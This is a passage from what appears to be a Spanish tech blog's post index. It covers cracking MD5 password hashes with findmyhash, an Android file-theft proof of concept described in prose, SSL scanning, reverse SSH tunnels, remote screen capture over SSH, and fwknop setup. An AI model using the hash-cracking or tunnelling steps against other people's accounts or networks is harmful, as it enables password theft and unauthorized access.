md5.com.cn (http://md5.com.cn)... HASH CRACKED!! The original string is: 80412999 The following hashes were cracked: 6289c5975815012768aefbf9a8d2fd3e -> 80412999 ``` Via segu-info.com.ar","tags":"hack","url":"https://karpoke.ignaciocano.com/2011/12/01/la-contrasena-del-presidente-obama/","loc":"https://karpoke.ignaciocano.com/2011/12/01/la-contrasena-del-presidente-obama/"},{"title":"Obtención remota de ficheros en Android < 2.3.4","text":"Hoy se ha hecho pública la prueba de concepto de Thomas Cannon que permite obtener ficheros de los dispositivos con Android con versiones anteriores a la 2.3.4. En la demostración se ha utilizado un HTC Desire (UK version) con Android 2.2. Yo lo he probado con un HTC Wildfire con Android 2.2.1 y también funciona. La vulnerabilidad permite que un sitio malicioso obtenga cualquier fichero guardado en la tarjeta SD, e incluso algunos ficheros e información guardados en el teléfono. No se puede acceder a ficheros del sistema, ya que se ejecuta dentro de la sandbox . El navegador de Android no pide confirmación al usuario para descargar el fichero, por ejemplo poc.html , y lo descarga de forma automática en el directorio /sdcard/download/poc.html . Mediante javascript es posible abrir automáticamente el fichero descargado, forzando al navegador a enviar los ficheros locales, sin pedir confirmación al usuario. El principal impedimento es que el atacante debe conocer la ruta y el nombre de los ficheros que quiere obtener. Sin embargo, algunas aplicaciones utilizan nombres concretos para guardar sus ficheros en la tarjeta SD o nombres que siguen una pauta concreta. Un ejemplo del resultado de la prueba de concepto es el siguiente: javascript Array ( [filename0] => L3Byb2MvdmVyc2lvbg== [data0] => TGludXggdmVyc2lvbiAyLjYuMzIuMjEtZzZjNTVlZTQgKGh0Yy1rZXJuZWxAYW5kMTgtMikgKGdjYyB2ZXJzaW9uIDQuNC4wIChHQ0MpICkgIzEgUFJFRU1QVCBUaHUgRGVjIDIgMTY6NTk6MjcgQ1NUIDIwMTAK ) El contenido está en base 64. Si lo decodificamos: bash $ base64 -d <<< \"L3Byb2MvdmVyc2lvbg==\" /proc/version $ base64 -d <<< \"TGludXggdmVyc2lvbiAyLjYuMzIuMjEtZzZjNTVlZTQgKGh0Yy1rZXJuZWxAYW5kMTgtMikgKGdjYyB2ZXJzaW9uIDQuNC4wIChHQ0MpICkgIzEgUFJFRU1QVCBUaHUgRGVjIDIgMTY6NTk6MjcgQ1NUIDIwMTAK\" Linux version 2.6.32.21-g6c55ee4 (htc-kernel@and18-2) (gcc version 4.4.0 (GCC) ) #1 PREEMPT Thu Dec 2 16:59:27 CST 2010 Referencias Via @hackplayers Prueba de concepto en exploit-db.com Blog de Thomas Cannon","tags":"hack","url":"https://karpoke.ignaciocano.com/2011/11/28/obtencion-remota-de-ficheros-en-android-2-3-4/","loc":"https://karpoke.ignaciocano.com/2011/11/28/obtencion-remota-de-ficheros-en-android-2-3-4/"},{"title":"TLSSLed v1.2","text":"TLSSLed es un script cuya finalidad es evaluar la seguridad de SSL/TLS de un servidor web. Se basa en el escáner de SSL/TLS, sslscan , el cual a su vez se basa en la librería openssl , y en el comando openssl s_client. Entre las comprobaciones que realiza se incluyen comprobar si el servidor soporta SSLv2, cifrado NULL, cifrados débiles por la longitud de su clave (40 ó 56 bits), la disponibilidad de cifrados fuertes, como AES, si el certificado está firmado con MD5 y si permite la renegociación de SSL/TLS. (Ya está disponible la versión 1.3 ) Un ejemplo de uso: ```bash $ TLSSLed_v1.2.sh 127.0.0.1 443 TLSSLed - (1.2) based on sslscan and openssl by Raul Siles (www.taddong.com) openssl version: OpenSSL 1.0.0e 6 Sep 2011 sslscan version 1.8.2 [-] Analyzing SSL/TLS on 127.0.0.1:443 .. [*] The target service 127.0.0.1:443 seems to speak SSL/TLS... [-] Running sslscan on 127.0.0.1:443... [*] Testing for SSLv2 ... [*] Testing for NULL cipher ... [*] Testing for weak ciphers (based on key length) ... [*] Testing for strong ciphers (AES) ... Accepted SSLv3 256 bits DHE-RSA-AES256-SHA Accepted SSLv3 256 bits AES256-SHA Accepted SSLv3 128 bits DHE-RSA-AES128-SHA Accepted SSLv3 128 bits AES128-SHA Accepted TLSv1 256 bits DHE-RSA-AES256-SHA Accepted TLSv1 256 bits AES256-SHA Accepted TLSv1 128 bits DHE-RSA-AES128-SHA Accepted TLSv1 128 bits AES128-SHA [*] Testing for MD5 signed certificate ... [*] Testing for certificate public key length ... RSA Public Key: (2048 bit) [*] Testing for certificate subject ... Subject: /C=ES/ST=IB/L=Palma de Mallorca/O=Localhost/CN=Localhost/emailAddress=karpoke@localhost [*] Testing for certificate CA issuer ... Issuer: /C=ES/ST=IB/O=Localhost CA/CN=Localhost/emailAddress=karpoke@localhost [*] Testing for certificate validity period ... Today: dom oct 23 13:21:35 UTC 2011 Not valid before: Jun 14 11:26:10 2011 GMT Not valid after: Jun 13 11:26:10 2012 GMT [*] Checking preferred server ciphers ... Prefered Server Cipher(s): SSLv3 256 bits DHE-RSA-AES256-SHA TLSv1 256 bits DHE-RSA-AES256-SHA [-] Testing for SSLv3/TLSv1 renegotiation vuln. (CVE-2009-3555) ... [*] Testing for secure renegotiation ... Secure Renegotiation IS supported [-] Testing for TLS v1.1 and v1.2 (CVE-2011-3389 aka BEAST) ... [*] Testing for SSLv3 and TLSv1 support first ... Accepted SSLv3 256 bits DHE-RSA-AES256-SHA Accepted SSLv3 256 bits AES256-SHA Accepted SSLv3 168 bits EDH-RSA-DES-CBC3-SHA Accepted SSLv3 168 bits DES-CBC3-SHA Accepted SSLv3 128 bits DHE-RSA-AES128-SHA Accepted SSLv3 128 bits AES128-SHA Accepted SSLv3 128 bits RC4-SHA Accepted SSLv3 128 bits RC4-MD5 Accepted TLSv1 256 bits DHE-RSA-AES256-SHA Accepted TLSv1 256 bits AES256-SHA Accepted TLSv1 168 bits EDH-RSA-DES-CBC3-SHA Accepted TLSv1 168 bits DES-CBC3-SHA Accepted TLSv1 128 bits DHE-RSA-AES128-SHA Accepted TLSv1 128 bits AES128-SHA Accepted TLSv1 128 bits RC4-SHA Accepted TLSv1 128 bits RC4-MD5 [*] Testing for TLS v1.1 support ... The local openssl version does NOT support TLS v1.1 [*] Testing for TLS v1.2 support ... The local openssl version does NOT support TLS v1.2 [-] Testing for SSL/TLS HTTPS security headers ... [*] Testing for Strict-Transport-Security (STS) header ... [*] Testing for cookies with the secure flag ... [*] Testing for cookies without the secure flag ... [-] New files created: -rw-rw-r-- 1 karpoke karpoke 9223 2011-10-23 15:21 sslscan_127.0.0.1_443_2011-10-23_151957.log -rw-rw-r-- 1 karpoke karpoke 2796 2011-10-23 15:21 openssl_HEAD_127.0.0.1_443_2011-10-23_151957.log -rw-rw-r-- 1 karpoke karpoke 2511 2011-10-23 15:19 openssl_RENEG_127.0.0.1_443_2011-10-23_151957.log -rw-rw-r-- 1 karpoke karpoke 688 2011-10-23 15:19 openssl_RENEG_127.0.0.1_443_2011-10-23_151957.err -rw-rw-r-- 1 karpoke karpoke 582 2011-10-23 15:21 openssl_HEAD_127.0.0.1_443_2011-10-23_151957.err [-] done ``` Via L'home dibuixat .","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/10/23/tlssled-v1-2/","loc":"https://karpoke.ignaciocano.com/2011/10/23/tlssled-v1-2/"},{"title":"Facebook y el RSS de las páginas","text":"Si queremos seguir las actualizaciones de una página de Facebook , no tenemos más que copiar el ID de la página y sustituirlo en la siguiente URL, en este caso en formato Atom 1.0: bash http://www.facebook.com/feeds/page.php?format=atom10&id=xxxxxxxxxxxx O la siguiente, para usar el formato RSS 2.0: bash http://www.facebook.com/feeds/page.php?format=rss20&id=xxxxxxxxxxxx Por ejemplo, para añadir el RSS de la página de Amstrad ESP, http://www.facebook.com/pages/Amstrad-ESP/ 72227918057 , no tenemos más que utilizar la siguiente URL: http://www.facebook.com/feeds/page.php?format=rss20&id= 72227918057 http://www.facebook.com/feeds/page.php?format=rss20&id=72227918057 \"Amstrad ESP. Facebook Page RSS\"","tags":"hack","url":"https://karpoke.ignaciocano.com/2011/10/10/facebook-y-el-rss-de-las-paginas/","loc":"https://karpoke.ignaciocano.com/2011/10/10/facebook-y-el-rss-de-las-paginas/"},{"title":"El consumo de la batería","text":"Con las últimas versiones del kernel el consumo de la batería se había disparado , reduciendo el tiempo de vida útil de la batería. Las baterías son un bien preciado, por lo que existen multitud de trucos para intentar alargar su tiempo de vida . Aunque no se conoce con certeza si este elevado consumo podría deberse a un fallo , en los casos en que la BIOS indicaba que ASPM no estaba soportado estando éste habilitado, o a la configuración en algunos parámetros del kernel . Configuración del kernel Entre estos parámetros se encuentran: dirty_writeback_centisecs , que indica las centésimas entre despertares de pdflush para escribir datos en disco y tiene un valor por defecto de 500, lo cual es óptimo para el rendimiento pero no para la vida de la batería. El parámetro no cambia automáticamente cuando desconectamos el portátil de la corriente. nmi_watchdog , sirve para generar interrupciones no enmascarables (NMI). Se puede utilizar para depurar el kernel . Ejecutando NMI periódicas, el kernel puede monitorizar locks en cualquier CPU. sched_smt_power_savings , se utiliza para controlar la potencia de la CPU . Bajo condiciones de poca carga, y si la política de ahorro energético está habilitada, el planificador minimiza el número de núcleos que ejecutan dicha carga, ahorrando energía a costa del rendimiento. snd_hda_intel/parameters/power_save , especifica el número de segundos tras los cuales el módulo de sonido se deshabilita. bash $ cat /sys/module/snd_hda_intel/parameters/power_save 0","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/10/01/el-consumo-de-la-bateria/","loc":"https://karpoke.ignaciocano.com/2011/10/01/el-consumo-de-la-bateria/"},{"title":"Túnel SSH inverso","text":"El escenario es el siguiente. Tenemos un equipo remoto C detrás de un cortafuegos, router o similar, que no podemos configurar y no permite conexiones entrantes, de tal manera que el equipo es inaccesible desde el exterior de la red en la que está. Otro equipo A, el nuestro, también está detrás de un cortafuegos, en otra red, que tampoco podemos configurar y tampoco permite conexiones entrantes. La buena noticia es que tenemos un servidor remoto B en otra red diferente al que sí tenemos acceso por SSH desde el equipo remoto C y desde el nuestro (el A). Tanto el equipo remoto C como el servidor B tienen un servidor SSH corriendo. Una posible solución es abrir un túnel inverso del equipo C al servidor B, entonces desde nuestro equipo (el A) conectarnos al servidor B y de ahí al equipo remoto C. El siguiente comando abre un túnel inverso desde el equipo C al servidor B, de tal manera que en el servidor B en el puerto 8000 se podrá iniciar una conexión que será redirigida al servidor SSH del equipo C: bash remoteC$ ssh -f -N -R 8000:localhost:22 userB@remoteB # remoteC:22 ---> remoteB:8000 hostA$ ssh userB@remoteB remoteB$ ssh -p8000 userC@localhost Estas dos últimas acciones se pueden combinar en una sola si utilizamos el argumento -t para utilizar el servidor SSH de B como servidor intermedio para acceder a C (a través de la redirección en el propio servidor B): bash remoteC$ ssh -f -N -R 8000:localhost:22 userB@remoteB # remoteC:22 ---> remoteB:8000 hostA$ ssh -t userB@remoteB ssh -p8000 localhost Otra forma es abrir un túnel desde nuestro equipo creando una redirección local al puerto del servidor B en el cual se ha creado, previamente, el túnel inverso al equipo remoto C. De esta forma bastará conectarnos a nuestro propio equipo para tener acceso al equipo remoto C: bash remoteC$ ssh -f -N -R 8000:localhost:22 userB@remoteB # remoteC:22 ---> remoteB:8000 hostA$ ssh -f -N -L 8001:localhost:8000 userB@remoteB # remoteB:8000 ---> hostA:8001 hostA$ ssh -p8000 userC@localhost Sería mejor que los usuarios para conectarnos al servidor B desde el equipo remoto C y desde el nuestro fuesen distintos: bash remoteC$ ssh -f -N -R 8000:localhost:22 user_1B@remoteB # remoteC:22 ---> remoteB:8000 hostA$ ssh -f -N -L 8001:localhost:8000 user_2B@remoteB # hostA:8001 < -- remoteB:8000 hostA$ ssh -p8000 userC@localhost Como último comentario, si vamos a utilizar este sistema para administrar equipos remotos, quizá sería interesante utilizar algún sistema de contraseñas de un solo uso en el servidor.","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/09/30/tunel-ssh-inverso/","loc":"https://karpoke.ignaciocano.com/2011/09/30/tunel-ssh-inverso/"},{"title":"Encuentra el hash","text":"Existen herramientas que permiten romper un hash , aunque a veces puede ahorrar tiempo y recursos buscar si el hash ya ha sido encontrado . Ni siquiera hace falta una rainbow table . findmyhash es un script escrito en Python que puede buscar diferentes tipos de hash en diferentes servicios de cracking online . Los algoritmos soportados son los siguientes: MD4 MD5 SHA1 SHA256 RMD160 MYSQL CISCO7 LM NTLM Un ejemplo sencillo. Si no encuentra el hash , también lo buscará en Google: ```bash \\( hash=\\) (echo 123456 | md5sum | cut -f1 -d\" \") $ echo $hash f447b20a7fcbf53a5d5be013ea0b15af $ ./findmyhash.py MD5 -h $hash -g [...] Analyzing with noisette.ch (http://md5.noisette.ch)... HASH CRACKED!! The original string is: 123456 The following hashes were cracked: f447b20a7fcbf53a5d5be013ea0b15af -> 123456 ``` Otro ejemplo, esta vez con las 20 contraseñas más utilizadas : bash $ HASH_FILE=$(mktemp) $ passwords=( 123456 12345 123456789 Password iloveyou princess rockyou 1234567 12345678 abc123 Nicole Daniel babygirl monkey Jessica Lovely michael Ashley 654321 Qwerty ) $ for p in ${passwords[*]}; do hash=$(echo $p | md5sum | cut -f1 -d\" \") echo $hash >> $HASH_FILE done $ python findmyhash.py MD5 -f $HASH_FILE > hash_results.txt Después de un rato, casi una hora, ha sido capaz de encontrar 6 contraseñas: bash $ grep \"The original string\" hash_results.txt The original string is: 123456 The original string is: 12345 The original string is: 12345678 The original string is: abc123 The original string is: Jessica The original string is: michael La opción para buscar en Google, en caso de no encuentrar el hash en ninguno de esos servicios online , sólo está disponible si buscamos un único hash , así que modificaremos ligeramente el script anterior para que, en lugar de pasarle un fichero con los hashes , vayamos llamando al script de uno en uno: bash $ passwords=( 123456 12345 123456789 Password iloveyou princess rockyou 1234567 12345678 abc123 Nicole Daniel babygirl monkey Jessica Lovely michael Ashley 654321 Qwerty ) $ > hash_results.txt $ for p in ${passwords[*]}; do hash=$(echo $p | md5sum | cut -f1 -d\" \") python findmyhash.py MD5 -h $hash -g >> hash_results.txt done La diferencia respecto al caso anterior es que, para los hashes que no ha encontrado en ningún servicio, realiza una búsqueda en Google y muestra los primeros enlaces. Por ejemplo, el hash para la contraseña 654321 no ha sido capaz de encontrarlo, pero la búsqueda en Google, entre otras, ha proporcionado la URL http://paste2.org/p/1360449, que sí la contiene. if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"hack","url":"https://karpoke.ignaciocano.com/2011/09/30/encuentra-el-hash/","loc":"https://karpoke.ignaciocano.com/2011/09/30/encuentra-el-hash/"},{"title":"Twitter y el RSS de las cuentas de usuario","text":"Desde hace un tiempo, parece que Twitter ha ido ocultando la posibilidad de seguir una cuenta a través de RSS . Han aparecido algunos servicios que intentan corregir este comportamiento , aunque realmente no son necesarios. Para seguir a un usuario a través del RSS lo único que tenemos que hacer es eliminar el shebang de la URL, es decir, el #! . Por ejemplo, para seguir a DragonJAR , muy recomendable, deberíamos usar la URL: http://twitter.com/DragonJAR , en lugar de http://twitter.com/#!/DragonJAR . Si ponemos esa URL en un navegador, nos redirecciona a la URL con el shebang , pero si la descargamos, podemos ver que ahí están definidos los enlaces a los RSS de los tweets del usuario y de sus favoritos: ```bash $ curl -s http://twitter.com/DragonJAR | grep link.*rss+xml ```","tags":"hack","url":"https://karpoke.ignaciocano.com/2011/09/30/twitter-y-el-rss-de-las-cuentas-de-usuario/","loc":"https://karpoke.ignaciocano.com/2011/09/30/twitter-y-el-rss-de-las-cuentas-de-usuario/"},{"title":"Imagen a través de SSH","text":"Si tenemos acceso por SSH a otro ordenador, ambos con entorno gráfico, podemos redirigir la pantalla, el teclado y el ratón en ambos sentidos, es decir, podemos conseguir cosas como: » aplicaciones remotas que se muestren en nuestro equipo » aplicaciones remotas que se muestren en el equipo remoto » aplicaciones locales que se muestren en el equipo remoto » recibir una captura de pantalla del equipo remoto » enviar una captura de pantalla de nuestro equipo al equipo remoto » mostrar una imagen remota en nuestro equipo » mostrar una imagen local en el equipo remoto Aplicaciones remotas en el servidor gráfico local Si queremos que un programa de un equipo remoto se ejecute en el servidor gráfico de nuestro equipo, una de las cosas que podemos hacer es configurar el servidor SSH del equipo remoto para que acepte el reenvío X11, o X11 Forwarding . De esta forma la conexión va cifrada y, además, tampoco debemos preocuparnos por el valor de la variable de entorno DISPLAY . Para que el servidor SSH permita el reenvío X11, deberemos asegurarnos de que en el archivo de configuración /etc/ssh/sshd_config aparece lo siguiente: bash X11Forwarding yes Si no estuviera, lo añadimos y reiniciamos el servicio. Ahora, iniciaremos una conexión SSH desde el cliente, utilizando el argumento -X de ssh : bash $ ssh -C -X user@remotehost El argumento -X permite reenviar el terminal gráfico. Se debe utilizar con cuidado, tal como lo indican en la página del manual. Un usuario del equipo remoto que pueda saltarse los permisos de archivo (para la base de datos de usuarios autorizados del servidor X) podría acceder al terminal gráfico de nuestro equipo a través de la conexión reenviada. Un atacante podría realizar acciones como por ejemplo monitorizar las pulsaciones de teclado. Por este motivo, el reenvío X11 está sujeto a varias restricciones por defecto según la política de seguridad de X11. Utilizando el argumento -Y se confía en el equipo remoto y no se llevan a cabo los controles ni se aplican estas restricciones. Cuando ejecutemos una aplicación con interfaz gráfica, ésta se abrirá en nuestro equipo. bash remotehost$ xeyes & Aplicaciones remotas en el servidor gráfico remoto Si lo que queremos es abrir un programa con interfaz gráfica del equipo remoto, pero esta vez en el servidor gráfico del equipo remoto , no es necesario recurrir al reenvío X11. Lo único que hay que hacer, una vez iniciada la sesión en el equipo remoto, es modificar el valor de la variable de entorno DISPLAY : bash remotehost$ export DISPLAY=:0 Cuando lancemos una aplicación con interfaz gráfica instalada en el equipo remoto, ésta se abrirá en el servidor gráfico del equipo remoto. En lugar de exportar la variable, podemos definirla únicamente para una aplicación en concreto: bash $ DISPLAY=:0 xterm Aplicaciones gráficas locales en el entorno gráfico remoto Podemos utilizar lo visto en los dos casos anteriores para conseguir que una aplicación de nuestro equipo se ejecute en el servidor gráfico remoto a través de SSH. Necesitaremos tener un servidor SSH corriendo en nuestro equipo. Primero, establecemos un túnel inverso entre nuestro equipo y el equipo remoto. Esto quiere decir que se creará una redirección en el puerto 8000 del equipo remoto al servidor SSH de nuestro equipo. bash $ ssh -R 8000:localhost:22 remoteuser@remotehost Una vez iniciada esta conexión, modificaremos el valor de la variable DISPLAY y nos conectaremos al puerto local 8000 que redirige a nuestro equipo: bash remotehost$ DISPLAY=:0 ssh -C -X -p8000 user@localhost Cuando hayamos iniciado sesión en nuestro equipo será como tener otro terminal abierto, sólo que las aplicaciones que ejecutemos en éste se mostrarán en el equipo remoto. En esta página podemos encontrar una comparativa del consumo de ancho de banda de diferentes programas a través del túnel seguro. Obtener una captura del escritorio remoto Si lo que queremos es hacer una captura del escritorio del equipo remoto, podemos utilizar el comando import : bash $ ssh -C user@remotehost \"DISPLAY=:0.0 import -window root -format png -\" | display -format png - En lugar de visualizarla directamente, podríamos guardarla en el equipo remoto y luego copiar las capturas con scp . Otro comando sería scrot , disponible en los repositorios: bash $ ssh -C user@remotehost \"DISPLAY=:0.0 scrot -z - | display - Si está puesto el protector de pantalla , por ejemplo, si la captura sale en negro, deberemos matar el proceso para poder ver el escritorio. bash $ ssh user@remotehost \"pkill gnome-screensaver\" Mostrar una captura de nuestro escritorio en el equipo remoto El caso contrario al anterior. bash $ import -window root -format png - | ssh -C user@remotehost \"DISPLAY=:0.0 display -format png -\" Otra forma sería guardar la captura en un fichero, enviarlo y luego abrir una aplicación en el equipo remoto: bash $ import -window root -format png screenshot.png $ scp screenshot.png user@remotehost:~ $ ssh user@remotehost \"DISPLAY=:0 eog screenshot.png\" Mostrar imágenes del equipo remoto De la misma forma que realizamos una captura, podemos enviarnos una imagen y visualizarla directamente: bash $ ssh -C user@remotehost \"cat screenshot.png\" | display -format png - Mostrar imágenes de nuestro equipo en el equipo remoto Podemos conseguir que se habrá una aplicación remota que muestre una imagen de nuestro equipo: bash $ cat screenshot.png | ssh -C user@remotehost \"DISPLAY=:0 display -format png -\"","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/09/28/imagen-a-traves-de-ssh/","loc":"https://karpoke.ignaciocano.com/2011/09/28/imagen-a-traves-de-ssh/"},{"title":"Descargar archivos de Megaupload desde el terminal con plowshare","text":"plowshare es una herramienta diseñada para descargar y subir ficheros a los sitios de intercambio de ficheros más populares. También se pueden administrar directorios remotos y borrar enlaces. Instalación Primero, instalamos las dependencias: bash $ sudo aptitude install curl recode imagemagick tesseract-ocr-eng spidermonkey-bin rhino perlmagick aview Podemos descargar el código fuente desde el repositorio Git, en un tarball o en un paquete .deb : bash $ wget https://plowshare.googlecode.com/files/plowshare_1%7Egit20110914-1_all.deb $ sudo dpkg -i plowshare_1~git20110914-1_all.deb Descargando Para descargar un enlace de Megaupload, por ejemplo, escribimos: bash $ plowdown megaupload -a freeuser:password http://www.megaupload.com/?d=7V4SDTC7 También podemos pasarle un fichero que contenga los enlaces: bash $ plowdown links.txt Incluye un módulo de reconocimiento de caracteres que, para el caso de Megaupload, funciona perfectamente, por lo que no deberemos preocuparnos de tener que introducir los caracteres de ningún captcha . Si no pudiera leer el captcha , nos aparecerá una ventana mostrándonos dicho captcha y un campo de texto para que introduzcamos el contenido. Actualizado el 9 de diciembre de 2016 A estas alturas, hace tiempo que Megaupload desapareció y, algo más tarde, apareció en su lugar Mega . plowshare también se ha renovado, por ejemplo lo podemos utilizar para descargar de zippyshare , e incluye plowdown , una herramienta que facilita la actualización del programa así como la instalación de módulos. Uno de estos módulos es el que necesitaremos si queremos descargar archivos de Mega, de lo contrario, nos aparecerá un mensaje parecido al siguiente: bash $ plowdown 'https://mega.nz/#!3tNDHTAT!ZzWFe-rkF-Tli0o7qoEbbyQcO57FRrmErlu5J5jIEEA' No module found, try simple redirection Skip: no module for URL (https://mega.nz) La instalación de dicho módulo es muy sencilla: bash $ plowmod -i https://github.com/mcrapet/plowshare-module-mega.git $ cd ~/.config/plowshare/modules.d/mega.git $ ./autogen.sh $ ./configure --enable-local $ make Ahora ya sí que podremos descargar de Mega sin problemas. Para mantener tanto la herramienta como los módulos actdualizados, basta ejecutar: bash $ plowdown -u","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/09/18/descargar-archivos-de-megaupload-desde-el-terminal-con-plowshare/","loc":"https://karpoke.ignaciocano.com/2011/09/18/descargar-archivos-de-megaupload-desde-el-terminal-con-plowshare/"},{"title":"fwknop: Single Packet Authorization y port knocking","text":"fwknop implementa un esquema de autorización llamado Single Packet Authorization (SPA) . Mediante SPA necesita un único paquete cifrado para abrir puertos en el cortafuegos o llevar a cabo acciones en el sistema. Se utiliza en conjunción con un cortafuegos que impide la conexión a los puertos de los servicios que queremos proteger. De esta forma, se logra una capa extra de seguridad, ya que los hace permanecer invisibles, descartando silenciosamente los paquetes que llegan a dicho puerto. Para poder tener acceso a los servicios protegidos, la parte servidor de fwknop esnifa pasivamente los paquetes que llegan al servidor usando libpcap y, en caso de recibir de parte del cliente de fwknop un paquete cifrado válido que no ha sido recibido antes, se permite el acceso a través del cortafuegos. SPA tiene los beneficios del port knocking , es decir, la protección de un servicio tras un filtro que descarta los paquetes por defecto, pero con las siguientes ventajas: puede utilizar cifrado asimétrico. Port knocking utiliza únicamente las cabeceras de los paquetes, las cuales no suelen ser suficientes para guardar una clave de cifrado asimétrico, que suelen tener una longitud mayor que la de una clave de cifrado simétrico los paquetes no se pueden reenviar. En port knocking hay estrategias para reducir el riesgo de reutilizar un paquete, pero no son fácilmente escalables cuando se tienen muchos usuarios. SPA no se puede romper con ataques triviales para averiguar la secuencia. Un atacante monitorizando la red podría averiguar la secuencia utilizada por port knocking , simplemente encontrando un paquete duplicado (que venga de una secuencia real) a un puerto anterior de la secuencia SPA sólo envía un paquete, por lo que es más rápido y para alguien que estuviera monitorizando no aparece como un escaneo de puertos. Port knocking necesita un retardo de tiempo entre paquetes sucesivos porque la entrega en orden no está garantizada Instalación de fwknop en Ubuntu En el servidor Instalamos fwknop-server y libpcap en el servidor: bash $ sudo aptitude install fwknop-server libpcap-dev Nos hará unas preguntas: bash Configure fwknop to protect the SSH port? Yes Sniffing interface: eth0 Encryption key to use: __********__ Utilizando claves GPG Esta clave que nos pide es para usar el algoritmo simétrico Rijndael, o AES. Si queremos utilizar cifrado asimétrico, podemos utilizar GnuPG. Para crear las claves GnuPG, lo hacemos directamente como el usuario root , no con sudo : ```bash $ sudo su gpg --gen-key RSA y RSA # RSA para firmar y cifrar 2048 bits # longitud de la clave 1y # la clave caducará en un año ``` Cuando terminen de crearse el par de claves, mostrará algo como lo siguiente: bash pub 2048R/4A064F2A 2011-09-17 [[caduca: 2012-09-16]] Huella de clave = 0CCD D9F5 1F77 E316 2B2B 0062 0C6E B0E6 4A06 4F2A uid Server sub 2048R/38F4A4A8 2011-09-17 [[caduca: 2012-09-16]] Exportamos la clave a un fichero: ```bash gpg -a --export 4A064F2A > fwknop-server.asc ``` Generando entropía Si nos aparece el mensaje: ```bash Es necesario generar muchos bytes aleatorios. Es una buena idea realizar alguna otra tarea (trabajar en otra ventana/consola, mover el ratón, usar la red y los discos) durante la generación de números primos. Esto da al generador de números aleatorios mayor oportunidad de recoger suficiente entropía. No hay suficientes bytes aleatorios disponibles. Por favor, haga algún otro trabajo para que el sistema pueda recolectar más entropía (se necesitan 92 bytes más). ``` Poniendo a trabajar el servidor podría servir para crear entropía. Algo como: ```bash ls -lRh / find / -name * ``` El paquete rng-tools ayuda a generar entropía . Una vez instalado desde los respositorios, modificamos el fichero /etc/default/rng-tools para que contenga: bash HRNGDEVICE=/dev/urandom Y reiniciamos el servicio: bash $ sudo service rng-tools restart En el cliente Si vamos a utilizar cifrado asimétrico, también deberemos generar el par de claves en el cliente: ```bash $ gpg --gen-key pub 2048R/723B172D 2011-09-17 [[caduca: 2012-09-16]] Huella de clave = 7EB6 CFC6 6617 6354 A2A1 2BBF FD15 D606 723B 172D uid Client sub 2048R/3482560E 2011-09-17 [[caduca: 2012-09-16]] ``` Exportamos la clave: bash $ gpg -a --export 723B172D > fwknop-client.asc Copiamos la clave que hemos exportado en el servidor al cliente, para firmar la clave del cliente con la del servidor. bash $ scp remotehost:~/fwknop-server.asc . Importamos la clave del servidor: bash $ gpg --import fwknop-server.asc gpg: clave 4A064F2A: clave pública \"Server \" importada gpg: Cantidad total procesada: 1 gpg: importadas: 1 (RSA: 1) Y la firmamos con la nuestra. Nos pedirá la contraseña: ```bash $ gpg --sign-key server@localhost pub 2048R/4A064F2A creado: 2011-09-17 [caduca: 2012-09-16] uso: SC confianza: desconocido validez: desconocido sub 2048R/38F4A4A8 creado: 2011-09-17 [caduca: 2012-09-16] uso: E desconocido (1). Server pub 2048R/4A064F2A creado: 2011-09-17 [caduca: 2012-09-16] uso: SC confianza: desconocido validez: desconocido Huella de clave primaria: 0CCD D9F5 1F77 E316 2B2B 0062 0C6E B0E6 4A06 4F2A Server Esta clave expirará el 2012-09-16. ¿Está realmente seguro de querer firmar esta clave con su clave: \"Client \" (723B172D)? ¿Firmar de verdad? (s/N) s Necesita una frase contraseña para desbloquear la clave secreta del usuario: \"Client \" clave RSA de 2048 bits, ID 723B172D, creada el 2011-09-17 ``` Ahora lo haremos a la inversa. Copiamos nuestra 